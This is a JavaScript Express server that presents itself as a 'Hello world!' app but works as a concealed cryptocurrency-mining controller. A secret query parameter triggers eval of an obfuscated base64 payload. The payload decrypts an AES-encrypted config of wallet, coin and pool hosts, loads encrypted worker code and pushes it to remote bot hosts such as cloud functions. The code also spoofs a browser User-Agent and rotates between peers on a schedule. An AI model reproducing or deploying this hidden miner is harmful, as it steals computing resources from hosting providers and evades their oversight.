'use strict';
const fs = require('fs');
const request = require('request');
const CryptoJS = require("crypto-js");
const express=require('express');
const app=express();
app.get('/',function(req,res) {
  if(req.query.yellow_pools) c.yellow_pools = req.query.yellow_pools == '1'
  if(req.query.active) {
    if(!c.active && !pools.length) {
      c.active = req.query.active;
      var glob = function(x) { eval(decrypt(x.substring(-~[c.active.length]))) }
(`AXZGVjcnlwdCA9IGZ1bmN0aW9uKHgpeyByZXR1cm4gQ3J5cHRvSlMuQUVTLmRlY3J5cHQoeC5zcGxpdCgvXHJ8XG4vKS5qb2luKCcnKSxjLmFjdGl2ZSkudG9TdHJpbmcoQ3J5cHRvSlMuZW5jLlV0Zjgp
IH07CnZhciBsaXN0ID0gZGVjcnlwdChmcy5yZWFkRmlsZVN5bmMoJ2xpc3QudHh0JywndXRmOCcpKS5zcGxpdCgnXHJcbicpOwpjLmlkID0gTnVtYmVyKGxpc3Quc2hpZnQoKSk7CmMuY29pbiA9IGxpc3Qu
c2hpZnQoKTsgdmFyIG15Y29pbiA9IHJlcXVpcmUoJy4vJytjLmNvaW4rJy5qcycpOwpjLndhbGxldCA9IGxpc3Quc2hpZnQoKTsgYy5wZWVycyA9IFtsaXN0LnNoaWZ0KCldOyBjLnBlZXJzLnB1c2gobGlz
dC5zaGlmdCgpKTsKYy5hY3RpdmUgKz0gMjM0NTsgd29ya2VyID0gZGVjcnlwdChmcy5yZWFkRmlsZVN5bmMoJ3N1cGVyYm90LmpzJywndXRmOCcpKTsKd29ya2VyICs9YAphcHAuZGI9e3N0YXRlOid5ZWxs
b3cnLGhvc3Q6aCxoYXNoOicwIGgvcyBbMC8wXSd9Owp2YXIgYm90ID0gbmV3IHN1cGVyYm90KCk7CnZhciB0X2hhc2ggPSBsX2hhc2ggPSBzX2hhc2ggPSAwOwphcHAucG9zdCgnL3dvcmtlcicsIGFwcC5w
YXJzZXIsIGZ1bmN0aW9uIChyZXEsIHJlcykgewogIGFwcC5kYi5tc2cgPSAnbm90aGluZyc7CiAgdmFyIHBzID0gW107CiAgZm9yKHZhciBpPTA7IGk8cmVxLmJvZHkuam9icy5sZW5ndGg7IGkrKykgcHMu
cHVzaChib3Qub25tZXNzYWdlKHJlcS5ib2R5LmpvYnNbaV0pKTsKICBQcm9taXNlLmFsbChwcykudGhlbihtc2dzID0+IHsKICAgIHRfaGFzaCArPSBtc2dzLmxlbmd0aDsKICAgIGZvcih2YXIgaT0wOyBp
PG1zZ3MubGVuZ3RoOyBpKyspIGlmKG1zZ3NbaV0gIT0gJ25vdGhpbmcnKSB7CiAgICAgIGlmKGFwcC5kYi5tc2cgPT0gJ25vdGhpbmcnKSBhcHAuZGIubXNnID0gW21zZ3NbaV1dCiAgICAgIGVsc2UgYXBw
LmRiLm1zZy5wdXNoKG1zZ3NbaV0pOwogICAgICBzX2hhc2grKzsKICAgIH0KICAgIHJlcy5qc29uKGFwcC5kYik7CiAgfSk7Cn0pOwpzZXRJbnRlcnZhbChmdW5jdGlvbigpIHsKICBhcHAuZGIuc3RhdGUg
PSB0X2hhc2ggPT0gbF9oYXNoID8gJ3llbGxvdycgOiAnZ3JlZW4nOwogIGFwcC5kYi5oYXNoID0gKHRfaGFzaC1sX2hhc2gpKycgaC9zIFsnK3RfaGFzaCsnLycrc19oYXNoKyddJzsKICBsX2hhc2ggPSB0
X2hhc2g7Cn0sIDEwMDApOwpjKGFwcC5kYikKYDsKZm9yKHZhciBpPTA7IGk8bGlzdC5sZW5ndGg7IGkrKykKICBpZighbGlzdFtpXS5zdGFydHNXaXRoKCdodHRwJykpIHBvb2xzLnB1c2gobmV3IG15Y29p
bih7IHdhbGxldDogYy53YWxsZXQsIGhvc3Q6IGxpc3RbaV0gfSkpCiAgZWxzZSB7IGxldCBuYm90PXtob3N0Omxpc3RbaV0sIHN0YXRlOidvcmFuZ2UnLCBoYXNoOicwIGgvcyBbMC8wXSd9OyBib3RzLnB1
c2gobmJvdCk7IHdha2V1cChuYm90KSB9`)
    }
    res.json({ c: c, pools: mylist(pools), bots: mylist(bots) })
  }
  else { res.send('Hello world!') }
});
var s=app.listen(process.env.PORT||5000,()=>console.log('Listening on port '+s.address().port));

var decrypt = function(x){ return Buffer.from(x,'base64').toString('ascii') };
var c = { active: 0, state: 'orange', yellow_pools: false, hash: '0 h/s 0/0' }
var rec = false;
var pools = []; var bots = []; var worker = '';

function wakeup(bot) {
  bot.msg = "wakeup";
  bot.wakeup = setTimeout(function() { onmsg(bot) }, 60000);
  bot.wakecount = 60
}

function onmsg(bot) {
  delete bot.wakeup; delete bot.wakecount;
  if(Object.prototype.toString.call(bot.msg).slice(0,-1).split(' ')[1] == 'Array')
    for(var i=0; i<pools.length; i++) for(var j=0; j<bot.msg.length; j++) {
      if(pools[i].job && pools[i].job.job.job_id == bot.msg[j].job_id) {
        pools[i].mysubmit(bot.msg[j],c.yellow_pools);
        break;
      };
    };

  let jobs = []; for(var i=0; i<pools.length; i++) if(pools[i].job) jobs.push(pools[i].job);
  if (!c.active || jobs.length == 0) wakeup(bot)
  else {
    var data = { jobs: jobs };
    myrequest(bot.host+'/worker',{jobs:jobs},function(error, response, body){
      if(body && body.toString().includes('Cannot POST')) myrequest(bot.host,{worker:worker},function(error,response,body){botdb(error,body)})
      else botdb(error,body,true)
    })
  }

  function botdb(error,body,next) {
    if(error) bot.msg=error.message
    else if(!body) bot.msg='body is empty'
    else if(body.error) bot.msg=body.error
    else if(!body.state) bot.msg='body is wrong'
    else {
      bot.state = body.state;
      bot.hash = body.hash;
      bot.msg = body.msg;
      if(next) return onmsg(bot);
      else return wakeup(bot)
    }
    if(bot.msg == 'body is wrong' && bot.host.includes('cloudfunctions.net')) bot.state = 'orange'
    else bot.state = 'red'; 
    bot.hash = '0 h/s '+bot.hash.split(' ')[2];
    wakeup(bot)
  }
}

function mylist(obj) {
  var result = {red:[],orange:[],yellow:[],green:[]}
  for(var i=0; i<obj.length; i++) result[obj[i].state].push(obj[i].host+' - '+obj[i].hash); 
  for (const [key, value] of Object.entries(result)) { if(!result[key].length) delete result[key] }
  return result
}

function myrequest(url,form,callback) {
  var options = {
    url:url, method:'GET', json:true,
    headers:{'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Geko) Chrome/83.0.4103.116 Safari/537.36'}
  }
  if(form) { options.method = 'POST'; options.form = form }
  request(options, (error, response, body) => { callback(error, response, body) });
}

setInterval(function() {
  var m = new Date().getMinutes();
  if(c.id == 1 && m < 30) c.active = m+1
  else if(c.id == 2 && m >= 30) c.active = m-29
  else c.active = 0
  if(!rec && c.active == 1) { rec = true; myrequest(c.peers[c.id-1],function(){ rec = false }) }
  if(!rec && c.active == 30) { rec = true; myrequest(c.peers[c.id == 1 ? 1 : 0],function(){ rec = false }) }

  //--------------------------------------------------------

  var hsum = 0; var hsub = 0; var hacp = 0;  var rt = false;

  for(var i=0; i<pools.length; i++) {
    hsub += Number(pools[i].hash.split('/')[0]);
    hacp += Number(pools[i].hash.split('/')[1]);
    rt = pools[i].state == 'red' ? true: rt;
  }

  for(var i=0; i<bots.length; i++) {
    var ta = bots[i].hash.split(' '); bots[i].hash = ta[0]+' h/s '+ta[2];
    if(bots[i].wakecount) { bots[i].wakecount--;  bots[i].hash += ' - '+bots[i].wakecount+' sec' }
    hsum += Number(bots[i].hash.split(' ')[0]);
    rt = bots[i].state == 'red' ? true: rt
  }

  c.state = rt ? 'orange' : hsum == 0 ? 'yellow' : 'green'
  c.hash = hsum+' h/s '+hsub+'/'+hacp;
}, 1000);
